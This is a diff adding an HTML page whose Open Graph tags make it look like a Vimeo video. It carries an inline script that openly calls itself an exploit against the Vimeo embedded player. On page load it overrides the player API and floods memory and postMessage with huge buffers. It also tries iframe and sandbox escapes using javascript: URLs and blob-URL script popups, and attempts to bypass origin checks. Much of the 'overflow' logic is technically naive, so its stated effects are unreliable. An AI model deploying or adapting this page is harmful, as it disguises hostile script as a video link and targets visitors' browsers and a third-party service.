@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta property="og:site_name" content="Vimeo">
+    <meta property="og:url" content="https://vimeo.com/403530213">
+    <meta property="og:type" content="video.other">
+    <meta property="og:title" content="Test by Jxint">
+    <meta property="og:description" content="H4CK1NG 1S L1F3">
+    <meta property="og:image" content="https://i.vimeocdn.com/video/873029368-78a366b9407757e066a37718d766be53d3cb90d7f27708590ca16a1400e95b89-d">
+    <meta property="og:video" content="https://vimeo.com/403530213">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213">
+    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213">
+    <meta property="og:video:type" content="text/html">
+    <meta property="og:video:width" content="640">
+    <meta property="og:video:height" content="360">
+    <title>Bug Test</title>
+    <script>
+        // Create a massive buffer to attempt overflow
+        const largeBuffer = new Array(100000).fill('A').join('');
+        
+        // Attempt to overflow player event handlers
+        function overflowEvents() {
+            const events = [];
+            // Create thousands of event listeners
+            for(let i = 0; i < 50000; i++) {
+                events.push({
+                    event: 'play',
+                    callback: () => {
+                        try {
+                            // Try to break out of iframe isolation
+                            window.top.location = 'javascript:alert(1)';
+                        } catch(e) {}
+                    }
+                });
+            }
+            return events;
+        }
+
+        // Override Vimeo Player with malicious version
+        window.Vimeo = {
+            Player: function(element, options) {
+                const events = overflowEvents();
+                const player = this;
+                
+                // Attempt to overflow player properties
+                const overflowProps = {};
+                for(let i = 0; i < 50000; i++) {
+                    overflowProps['prop_' + i] = largeBuffer;
+                }
+                
+                // Attempt to exploit postMessage
+                window.addEventListener('message', function(e) {
+                    try {
+                        // Try to overflow message handling
+                        const data = JSON.parse(e.data + largeBuffer);
+                        
+                        // Attempt to break origin checks
+                        if(e.origin.includes('vimeo')) {
+                            // Try to escape sandbox via blob URLs
+                            const blob = new Blob(['<script>alert(1)<\/script>'], {type: 'text/html'});
+                            const url = URL.createObjectURL(blob);
+                            window.open(url);
+                        }
+                    } catch(e) {}
+                });
+
+                // Override player methods
+                this.element = element;
+                this.origin = '*';  // Try to bypass origin checks
+                
+                // Attempt to overflow event handlers
+                this.on = function(event, callback) {
+                    events.forEach(e => {
+                        try {
+                            // Try to break event handler
+                            const handler = new Function('return ' + callback.toString() + largeBuffer);
+                            handler();
+                        } catch(e) {}
+                    });
+                };
+
+                // Try to exploit iframe messaging
+                this.ready = function() {
+                    return new Promise(resolve => {
+                        try {
+                            // Attempt to break iframe isolation
+                            const frames = window.frames;
+                            for(let i = 0; i < frames.length; i++) {
+                                frames[i].postMessage(largeBuffer, '*');
+                            }
+                        } catch(e) {}
+                        resolve();
+                    });
+                };
+
+                return this;
+            }
+        };
+
+        // Initialize exploit
+        function attemptExploit() {
+            // Create iframe with suspicious attributes
+            const iframe = document.createElement('iframe');
+            iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin');
+            iframe.src = 'https://player.vimeo.com/video/403530213';
+            document.body.appendChild(iframe);
+
+            // Try to exploit iframe loading
+            iframe.onload = function() {
+                try {
+                    // Attempt to access iframe internals
+                    const win = iframe.contentWindow;
+                    const doc = iframe.contentDocument;
+                    
+                    // Try to inject into iframe context
+                    win.postMessage(largeBuffer, '*');
+                    
+                    // Attempt to overflow iframe properties
+                    for(let i = 0; i < 50000; i++) {
+                        win['prop_' + i] = largeBuffer;
+                    }
+                } catch(e) {}
+            };
+        }
+
+        window.onload = attemptExploit;
+    </script>
+    <script src="https://player.vimeo.com/api/player.js"></script>
+</head>
+<body>
+    <div id="player"></div>
+</body>
+</html>
